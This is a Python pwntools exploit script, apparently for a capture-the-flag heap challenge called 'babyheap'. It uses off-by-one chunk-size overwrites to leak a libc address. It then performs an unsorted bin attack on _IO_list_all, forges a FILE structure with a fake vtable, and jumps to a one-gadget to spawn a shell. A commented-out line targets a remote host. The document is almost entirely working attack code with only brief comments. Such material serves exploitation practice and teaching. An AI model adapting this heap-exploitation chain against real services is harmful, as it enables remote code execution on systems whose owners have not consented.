from pwn import *

elf = ELF('/home/nathan/share/babyheap')
p = process(elf.path)
print proc.pidof(p)[0]
raw_input()

#p = remote('202.120.7.204', 127)
def allocte(size):
	p.readuntil('Command:')
	p.sendline('1')
	p.readuntil('Size:')
	p.sendline(size)

def update(index,size,content):
	p.readuntil('Command:')
	p.sendline('2')
	p.readuntil('Index:')
	p.sendline(index)	
	p.readuntil('Size:')
	p.sendline(size)	
	p.readuntil('Content:')	
	p.send(content)	

def delete(index):
	p.readuntil('Command:')
	p.sendline('3')
	p.readuntil('Index:')
	p.sendline(index)

def view(index):
	p.readuntil('Command:')
	p.sendline('4')
	p.readuntil('Index:')
	p.sendline(index)

for i in range(0,3):
	allocte('24')
for i in range(0,7):
	allocte('88')

#leak unsorted bin
buf = 'A'*24 + '\x41'
update('0','25',buf)
delete('1')
allocte('48')
buf = 'A'*24 + '\xe1'
update('1','25',buf)
delete('2')
view('1')
p.readuntil('\xe1\x00\x00\x00\x00\x00\x00\x00')
unsorted_bin = u64(p.recv(8))
print hex(unsorted_bin)

#put unsorted in to small bin[4]
allocte('24')
allocte('88')
buf = 'A'*88 + '\xc1'
update('7','89',buf)
delete('2')
delete('0')
delete('8')
allocte('24')

#unsorted bin attack
libc = unsorted_bin - 0x3c4b78
print hex(libc)
io_list_all = libc + 0x3c5520
buf = 'A'*24 + p64(0x21) + p64(0) + p64(io_list_all-0x10)
update('1','48',buf)
allocte('24')

#fake io_file
io_str_jump = libc + 0x3c37a0
fake_vtable = io_str_jump
onegadget = libc + 0x4526a

#fp->_IO_write_ptr > fp->_IO_write_base
fake1 = p64(0)*3 + p64(3)
update('4','32',fake1)
#fp->_mode <= 0 + fake_vtable + onegadget
fake2 = p64(0) + p64(fake_vtable) + p64(onegadget)
update('6','24',fake2)
#expolit
allocte('24')
p.interactive()